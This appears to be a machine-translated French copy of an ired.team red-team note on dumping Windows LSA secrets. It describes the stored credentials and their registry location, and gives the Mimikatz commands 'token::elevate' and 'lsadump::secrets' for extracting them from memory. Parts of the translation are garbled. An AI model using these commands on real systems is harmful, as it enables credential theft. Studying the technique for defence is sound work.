Vidage des secrets LSA
======================

> ####
>
> [](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets#what-is-stored-in-lsa-secrets)
>
> Qu'est-ce qui est stocké dans les secrets LSA ?
>
> À l'origine, les secrets contenaient des enregistrements de domaine mis en cache. Plus tard, les développeurs Windows ont élargi le domaine d'application du stockage. À ce moment, ils peuvent stocker les mots de passe textuels des utilisateurs de PC, les mots de passe des comptes de service (par exemple, ceux qui doivent être exécutés par un certain utilisateur pour effectuer certaines tâches), les mots de passe Internet Explorer, les mots de passe de connexion RAS, les mots de passe SQL et CISCO, le compte SYSTÈME. mots de passe, données utilisateur privées telles que les clés de cryptage EFS et bien plus encore. Par exemple, le secret *NL$KM* contient la clé de chiffrement du mot de passe du domaine mis en cache.

[](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets#storage)

Stockage

---------------------------------------------------------------------------------------------------------------------------------

Les secrets LSA sont stockés dans le registre :

Copie

```
HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets
```

![](https://www.ired.team/~gitbook/image?url=https:%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-L_nYmCFo8ktkxF6qft3%252F-L_nZ7oFKOEfqjALlDeR%252FScreenshot%2520from%25202019-03-12%252020-20-39.png%3Falt=media%26token=89ffe933-7352-4323-ab6d-9f1e93213da4&width=768&dpr=4&quality=100&sign=48cdb9addcf03975605fe0f03d1a6433ed4c890d47f1a624ff46e15e1b391190)

[](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets#execution)

Exécution

------------------------------------------------------------------------------------------------------------------------------------

###

[](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets#memory)

Mémoire

Les secrets peuvent être supprimés de la mémoire comme suit :

attaquant@mimikatz

Copie

```
token::elevate
lsadump::secrets
```

![](https://www.ired.team/~gitbook/image?url=https:%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-L_nYmCFo8ktkxF6qft3%252F-L_n_A3tA2xMOaYQtxTp%252FScreenshot%2520from%25202019-03-12%252020-25-01.png%3Falt=media%26token=da194e49-eefd-47dc-984b-9a354ef80f85&width=768&dpr=4&quality=100&sign=74c1ceafd23c0602916d4329896a5c76a0795c60474b5c7c813fdcacdc4e7efb)

###

[](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets#registry)

Enregistrement
